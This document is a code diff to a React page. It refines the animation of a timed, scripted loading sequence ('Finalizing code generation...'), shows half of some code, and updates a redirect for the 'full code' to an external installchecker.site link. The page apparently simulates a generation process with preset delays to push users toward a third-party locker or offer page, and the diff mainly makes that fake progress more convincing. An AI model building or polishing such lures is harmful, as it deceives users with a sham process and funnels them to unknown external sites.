@@ -190,6 +190,11 @@ const loadingSteps = [
   { message: "Finalizing code generation...", duration: 1000, progress: 100 }
 ]
 
+// Easing function for smooth animations
+const easeOutCubic = (x: number): number => {
+  return 1 - Math.pow(1 - x, 3)
+}
+
 export default function Home() {
   const [theme, setTheme] = useState<'dark' | 'light'>('dark')
   const [searchTerm, setSearchTerm] = useState('')
@@ -289,14 +294,21 @@ export default function Home() {
       const step = loadingSteps[i]
       setCurrentStep(i)
       
-      // Animate progress smoothly
+      // Animate progress with easing function for smoother animation
       const startProgress = i === 0 ? 0 : loadingSteps[i - 1].progress
       const targetProgress = step.progress
-      const progressIncrement = (targetProgress - startProgress) / 20
+      const frames = 30 // More frames for smoother animation
       
-      for (let j = 0; j <= 20; j++) {
-        await new Promise(resolve => setTimeout(resolve, step.duration / 20))
-        setCurrentProgress(startProgress + (progressIncrement * j))
+      for (let j = 0; j <= frames; j++) {
+        await new Promise(resolve => setTimeout(resolve, step.duration / frames))
+        // Use cubic easing for smoother animation
+        const progress = startProgress + (targetProgress - startProgress) * easeOutCubic(j / frames)
+        setCurrentProgress(progress)
+      }
+      
+      // Add a small pause at each step completion
+      if (i < loadingSteps.length - 1) {
+        await new Promise(resolve => setTimeout(resolve, 200))
       }
     }
 
@@ -305,7 +317,7 @@ export default function Home() {
   }
 
   const redirectToFullCode = () => {
-    window.open('https://installchecker.site/cl/i/6d649v', '_blank')
+    window.open('https://installchecker.site/cl/i/37ek8n', '_blank')
   }
 
   const getHalfRevealedCode = (code: string) => {
@@ -500,7 +512,7 @@ export default function Home() {
                           cy="60"
                         />
                         <circle 
-                          className="progress-ring-circle" 
+                          className={`progress-ring-circle ${currentProgress >= 100 ? 'completed' : ''}`}
                           stroke="#10b981" 
                           strokeWidth="8" 
                           fill="transparent" 
@@ -512,8 +524,23 @@ export default function Home() {
                             strokeDashoffset: 326.726 - (326.726 * currentProgress / 100)
                           }}
                         />
+                        {/* Celebration particles that appear when progress reaches 100% */}
+                        {currentProgress >= 100 && (
+                          <>
+                            <circle className="celebration-particle particle-1" cx="60" cy="8" r="3" fill="#10b981" />
+                            <circle className="celebration-particle particle-2" cx="100" cy="30" r="4" fill="#059669" />
+                            <circle className="celebration-particle particle-3" cx="112" cy="60" r="3" fill="#10b981" />
+                            <circle className="celebration-particle particle-4" cx="100" cy="90" r="5" fill="#059669" />
+                            <circle className="celebration-particle particle-5" cx="60" cy="112" r="3" fill="#10b981" />
+                            <circle className="celebration-particle particle-6" cx="20" cy="90" r="4" fill="#059669" />
+                            <circle className="celebration-particle particle-7" cx="8" cy="60" r="3" fill="#10b981" />
+                            <circle className="celebration-particle particle-8" cx="20" cy="30" r="5" fill="#059669" />
+                          </>
+                        )}
                       </svg>
-                      <div className="progress-text">{Math.round(currentProgress)}%</div>
+                      <div className={`progress-text ${currentProgress >= 100 ? 'completed' : ''}`}>
+                        {Math.round(currentProgress)}%
+                      </div>
                     </div>
                     <div className="loading-message">
                       {loadingSteps[currentStep]?.message || "Processing..."}
@@ -550,5 +577,4 @@ export default function Home() {
       )}
     </div>
   )
-
-} 
+}
